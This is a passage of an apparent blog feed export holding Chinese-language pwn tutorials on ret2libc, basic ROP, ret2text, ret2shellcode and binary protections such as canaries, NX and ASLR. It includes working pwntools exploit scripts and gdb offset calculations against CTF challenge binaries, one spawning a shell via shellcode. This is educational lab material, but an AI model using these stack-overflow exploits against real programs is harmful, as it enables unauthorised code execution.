src="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201030191646499.png" class="lazyload" data-srcset="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201030191646499.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201030191646499"></p><p><img src="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201030191654581.png" class="lazyload" data-srcset="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201030191654581.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201030191654581"></p><h1 id="Return-to-dl-resolve"><a href="#Return-to-dl-resolve" class="headerlink" title="Return-to-dl_resolve"></a>Return-to-dl_resolve</h1><p>核心思想是利用_dl_runtime_resolve函数解析出system函数的地址，通常能够在没有提供libc库情况看下使用。</p><p>其适用情况需要满足如下三个条件。</p><p>1.未给出libc库。</p><p>2.没有开启PIE保护，如果开启了PIE保护，则还需要通过泄露获取基地址。</p><p>3.没有开启FULL RELRO。</p><h1 id="Return2libc"><a href="#Return2libc" class="headerlink" title="Return2libc"></a>Return2libc</h1><p>修改返回地址，让其指向内存中已有的某个函数</p><p>要完成的任务包括：在内存中确定某个函数的地址，覆盖掉返回地址，由于libc动态链接库中的函数被广泛应用，所以有很大概率在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如system()等），所以通常使用这些系统级函数来获得当前进程的控制权，鉴于要执行函数可能需要参数，比如调用system( )函数打开shell的完整形式为<code>system(&quot;/bin/sh&quot;)</code>，所以溢出数据也要包括必要的参数 。</p><p>payload：padding1+address of system() +padding2+ address of “/bin/sh”</p><p><img src="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201103211630588.png" class="lazyload" data-srcset="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201103211630588.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201103211630588"></p><p>padding1处的数据可以随意填充（注意不要包含”\x00“，否则程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system( )时system( )在内存中的地址，用来覆盖返回地址。padding2处的数据长度为4对于32位机器来说，对应调用system( )返回地址，在这里只需要打开shell，不关心从shell退出之后的行为，所以padding2的内容可以随意填充。address of “/bin/sh”是字符串”/bin/sh”在内存中的地址，作为传给syste( )的参数。</p><p><img src="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201103212115154.png" class="lazyload" data-srcset="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201103212115154.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201103212115154"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn-基础ROP</title>
      <link href="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/"/>
      <url>/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/</url>
      
        <content type="html"><![CDATA[<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><h5 id="rop构造原理：将返回地址改成“pop-，ret”指令的gadget，用来弹出后续的args，成为rop形式"><a href="#rop构造原理：将返回地址改成“pop-，ret”指令的gadget，用来弹出后续的args，成为rop形式" class="headerlink" title="rop构造原理：将返回地址改成“pop *，ret”指令的gadget，用来弹出后续的args，成为rop形式"></a>rop构造原理：将返回地址改成“pop *，ret”指令的gadget，用来弹出后续的args，成为rop形式</h5><p><img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201101141053667.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201101141053667.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201101141053667"></p><p>对于x64程序来说，一般情况下， 函数的参数较少，通常主要是利用寄存器来传递参数，所以在进入函数之前，<strong>应先将寄存器设置好</strong>，对于理解rop也比较容易</p><span id="more"></span><p><img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201101141313724.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201101141313724.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201101141313724"></p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>1.ret2text控制程序执行程序本身已有的代码（.text）。这种攻击方法是一种笼统描述，我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是gadgets)，这就是所说的ROP</p><p>checksec<img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018230307566.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018230307566.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018230307566"></p><p>其中没有开启栈溢出保护，这样就可以通过覆盖到返回地址执行程序</p><p><img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018230928211.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018230928211.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018230928211"></p><p>在main函数的伪代码中可以看到有个gets函数，参数s作为gets参数，s参数距离栈顶指针esp+1Ch，距离栈底指针ebp-64h，这里规定可以承载字符串的数量</p><p><img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018232659313.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018232659313.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018232659313"></p><p><strong>2.溢出过程</strong></p><p>需要考虑可控内存的起始地址距离main函数的返回地址的距离</p><p>1.在ida查看main函数的汇编代码，看到gets函数的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0804869B                 mov     dword ptr [esp], offset s ; &quot;There is something amazing here, do you&quot;...</span><br><span class="line">.text:080486A2                 call    _puts</span><br><span class="line">.text:080486A7                 lea     eax, [esp+80h+s]</span><br><span class="line">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure><p>可以看到gets函数的地址为<code>0x080486AE</code>    </p><p>在main接收字符串是通过相对esp进行索引的，所以需要使用到gdb查看一下索引时的esp和ebp位置。所以在call处下断点（0x080486AE），程序停在call的初始位置，字符串刚刚进栈，此时寄存器中显示的就是字符串的esp和ebp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x080486AE</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/hollk/ctf-challenges/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text </span><br><span class="line">There is something amazing here, do you know anything?</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080486ae in main () at ret2text.c:24</span><br><span class="line">24        gets(buf);</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────[ REGISTERS ]───────────────────────────────</span><br><span class="line"> EAX  0xffffd05c —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xf7fb5dc7 (_IO_2_1_stdout_+71) ◂— 0xfb68900a</span><br><span class="line"> EDX  0xf7fb6890 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c</span><br><span class="line"> EBP  0xffffd0c8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd040 —▸ 0xffffd05c —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34</span><br><span class="line"> EIP  0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8</span><br></pre></td></tr></table></figure><p>esp的位置为<code>0xffffd040</code>，ebp的位置为 <code>0xffffd0c8</code>,由于s相对与esp的索引为[esp+0x1c]</p><p><code>0xffffd040 + 0x1c = 0xffffd05c</code>，即可得到s的地址为<code>0xffffd05c</code>，那么s相对于ebp的偏移量为</p><p><code>0xffffd0c8 - 0xffffd05c = 0x6c</code>，最后再加上ebp保存的值，即是<code>0x6c+4</code>即可覆盖到ret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="comment">#from pwn import *</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x0804863A</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x6c</span>+<span class="string">&#x27;bbbb&#x27;</span>+ p32(success_addr)</span><br><span class="line"><span class="comment">#print p32(success_addr)</span></span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018234917179.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018234917179.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018234917179"></p><p>2.直接爆破，通过cyclic工具创建200个字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure><p>在gdb运行输入可以看到中断的地址</p><p><img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018235702431.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018235702431.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018235702431"></p><p>可以看到<code>0x62616164</code>中断，gdb报错停止在0x62616164位置，可以用cyclic查看停止处字符串长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cyclic -l 0x62616164</span><br><span class="line">112</span><br></pre></td></tr></table></figure><p>得到112，这个数字就是从输入内存可控起始地址到ret地址</p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>先checksec<img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019104048263.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019104048263.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201019104048263"></p><p>没有开启栈不可行保护</p><p>在IDA中可以看到该函数有gets函数，可以直接通过该函数覆盖到返回地址</p><p><img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019103226027.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019103226027.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201019103226027"></p><p>函数列表没有可以直接跳转的shellcode函数</p><p><img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019103322164.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019103322164.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201019103322164"></p><p>由于主函数可以有把输入的字符串赋值到buf2，而buf2是一个全局变量，看该所在的bss段是否可以执行</p><p>先在IDA中找到该bss段的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br><span class="line">.bss:0804A080</span><br></pre></td></tr></table></figure><p>gdb中可以看到</p><p><img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019103823478.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019103823478.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201019103823478"></p><p>可以看到该bss段是可执行的，现在的思路是把shellcode写到bss段，再将主函数的返回地址跳转到该bss段的地址，由于main函数的s是对esp有索引，所以需要去动态调试，现在IDA查看gets函数的地址，然后在gdb中设置该断点，查看此时的esp地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08048587                 call    _puts</span><br><span class="line">.text:0804858C                 lea     eax, [esp+80h+s]</span><br><span class="line">.text:08048590                 mov     [esp], eax      ; s</span><br><span class="line">.text:08048593                 call    _gets</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">EAX: 0xffffcebc --&gt; 0xf7ffd000 --&gt; 0x26f34 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb3dc7 --&gt; 0xfb48900a </span><br><span class="line">EDX: 0xf7fb4890 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb3000 --&gt; 0x1d4d6c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0xffffcf28 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffcea0 --&gt; 0xffffcebc --&gt; 0xf7ffd000 --&gt; 0x26f34 </span><br><span class="line">EIP: 0x8048593 (&lt;main+102&gt;:call   0x80483d0 &lt;gets@plt&gt;)</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br></pre></td></tr></table></figure><p>可以看到该esp地址为<code>0xffffcebc</code>到ebp<code>0xffffcf28</code> 的距离为108，再加上ebp的4，距离一共为112，写出payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn-程序保护机制</title>
      <link href="/2020/10/18/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2020/10/18/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="STACK-Canary栈溢出保护"><a href="#STACK-Canary栈溢出保护" class="headerlink" title="STACK Canary栈溢出保护"></a>STACK Canary栈溢出保护</h1><p>1.当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。<strong>攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉</strong>，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。</p><p>Canary 不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。</p><p>2.在GCC编译器中使用以下参数设置Canary:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br></pre></td></tr></table></figure><p>3.开启Cannary保护的栈结构</p><p><img src="/2020/10/18/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/image-20201018163656504.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/image-20201018163656504.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018163656504"></p><p>当程序有开启Canary编译后，在函数序言部分会去取fs寄存器0x28处的值，存放在栈中%ebp-0x8的位置，这个操作向栈中插入Canary值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure><p>在函数返回之前，会见该值取出，并与fs:0x28的值进行异或。如果异或的结果为0，说明Canary未被修改，函数会正常返回，这个操作即可监测是否发生一个栈溢出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>如果此时Canary已经非法修改，此时程序流程会走到<code>__stack_chk_fail</code></p><h1 id="NX数据执行保护"><a href="#NX数据执行保护" class="headerlink" title="NX数据执行保护"></a>NX数据执行保护</h1><p>数据执行保护，即DEP（Data Execution Prevention），是指禁止程序在非可执行的内存区中执行指令。在80x86的体系中，操作系统的内存管理是通过页面表(page table)存储方式来实现的，其最后一位就是NX位，<strong>0表示允许执行代码，1表示禁止执行代码</strong>。一般来说，NX主要是防止在栈或者堆上运行shellcode代码。gcc默认开启不可执行栈功能，添加编译选项<code>-z execstack</code>即可开启栈可执行功能。</p><h1 id="ASLR地址空间随机化"><a href="#ASLR地址空间随机化" class="headerlink" title="ASLR地址空间随机化"></a>ASLR地址空间随机化</h1><p>/proc/sys/kernel/randomize_va_space里的值可以控制系统级的ASLR。使用root权限可以进行修改，有三个值可以设置，具体说明：</p><p>-0：关闭ASLR。</p><p>-1：mmap base、stack、vdso page将随机化。这意味着”.so“文件将被加载到随机地址。链接时指定了-pie选项的可执行程序，其代码段加载地址将被随机化。配置内核时如果指定了CONFIG_COMPAT_BRK,则randomize_va_space默认为1，此时heap没有随机化。</p><p>-2：在1的举出上增加了heap随机化。配置内核时如果禁用CONFIG_COMPAT_BRK，则randomize_va_space默认为2。ASLR可以保证在每次程序加载的时候自身和所加载的库文件都会被映射到虚拟地址空间的不同地址处。</p><h1 id="PIE：代码段随机化"><a href="#PIE：代码段随机化" class="headerlink" title="PIE：代码段随机化"></a>PIE：代码段随机化</h1><h1 id="RELRO：重定位"><a href="#RELRO：重定位" class="headerlink" title="RELRO：重定位"></a>RELRO：重定位</h1><p>有两种情况，即partial relro和full relro，具体区别就是前者重定位信息（如got表）可写，后者不可写。</p>]]></content>
      
      
      <categories>
          
          <category> NodeJs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn-栈溢出</title>
      <link href="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
